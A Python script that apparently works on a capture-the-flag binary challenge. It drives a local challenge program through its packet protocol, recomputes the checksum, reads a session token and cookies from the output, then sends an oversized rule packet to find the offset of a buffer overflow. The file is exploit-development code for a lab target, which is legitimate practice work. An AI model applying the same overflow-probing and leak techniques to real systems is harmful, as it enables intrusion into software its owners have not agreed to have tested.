import subprocess, struct, re, os, sys, time

B64 = open(os.path.join(os.path.dirname(__file__), "chall.b64")).read()

# --- write binary ---
import base64
open("/tmp/chall", "wb").write(base64.b64decode(B64))
os.chmod("/tmp/chall", 0o755)

TOKEN = None

def calc_checksum(ptype, plen, payload, token):
    x = ((((ptype << 24) & 0xffffffff) ^ token) & 0xffffffff) ^ plen
    x ^= 0x31415926
    x &= 0xffffffff
    for i in range(plen):
        x = ((x << 5) | (x >> 27)) & 0xffffffff
        x = (x + ((i * 0x45d9f3b) ^ payload[i])) & 0xffffffff
    return x & 0xffffffff

def run(offset):
    global TOKEN
    p = subprocess.Popen(["/tmp/chall"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    s_in = p.stdin.fileno()
    s_out = p.stdout

    def sendall(b):
        os.write(s_in, b)

    def recv(timeout=1.0):
        # nonblocking-ish read
        import select
        buf = b""
        end = time.time() + timeout
        while time.time() < end:
            r,_,_ = select.select([s_out], [], [], 0.05)
            if r:
                d = os.read(s_out.fileno(), 4096)
                if not d: break
                buf += d
            else:
                pass
        return buf

    def packet(ptype, payload):
        plen = len(payload)
        cks = calc_checksum(ptype, plen, payload, TOKEN)
        sendall(f"{ptype}\n{plen}\n{cks}\n".encode() + payload)
        return recv()

    # banner
    banner = recv(1.5)
    m = re.search(rb"session token: ([0-9a-f]{8})", banner)
    if not m:
        return None
    TOKEN = int(m.group(1),16)

    # auth
    packet(2, struct.pack("<I", (TOKEN ^ 0xc0ffee00) & 0xffffffff))
    # small rule slot
    packet(3, struct.pack("<H",1)+b"A")
    # create report
    packet(4, b"HELLO")
    # leak R (report cookie) and D baseline
    r_cookie = None
    leakR = packet(4, b"R")
    m = re.search(rb"report cookie: 0x([0-9a-f]+)", leakR)
    if m:
        r_cookie = int(m.group(1),16)
    leakD = packet(4, b"D")
    m = re.search(rb"analyzer cookie: 0x([0-9a-f]+)", leakD)
    baseD = int(m.group(1),16) if m else None

    # overflow RULE: rlen must be <=0x78 and <= len-2
    # build payload = 2-byte rlen + overflow bytes
    # we want to place marker value at offset 'offset' from slot start
    MARK = 0x1122334455667788
    rlen = offset + 8
    ov = bytearray(rlen)
    # place MARK at 'offset'
    struct.pack_into("<Q", ov, offset, MARK)
    payload = struct.pack("<H", rlen) + bytes(ov)
    out = packet(3, payload)

    # leak D again
    leakD2 = packet(4, b"D")
    m = re.search(rb"analyzer cookie: 0x([0-9a-f]+)", leakD2)
    newD = int(m.group(1),16) if m else None

    p.kill()
    return {"r_cookie": r_cookie, "baseD": baseD, "newD": newD,
            "report_hex": hex(r_cookie) if r_cookie else None,
            "expected": hex((((TOKEN<<12) & 0xffffffffffffffff) ^ MARK ^ 0x5a5a5a5a41414141) & 0xffffffffffffffff) if False else None}

if __name__ == "__main__":
    offset = int(sys.argv[1])
    res = run(offset)
    if res is None:
        print(f"offset={offset}: FAIL (no banner)")
    else:
        # expected cookie for MARK at fp
        exp = (((TOKEN<<12) ^ 0x1122334455667788) ^ 0x5a5a5a5a41414141) & 0xffffffffffffffff
        hit = (res["newD"] == exp)
        print(f"offset={offset}: report={res['report_hex']} baseD={hex(res['baseD']) if res['baseD'] else None} newD={hex(res['newD']) if res['newD'] else None} expected={hex(exp)} HIT={hit}")
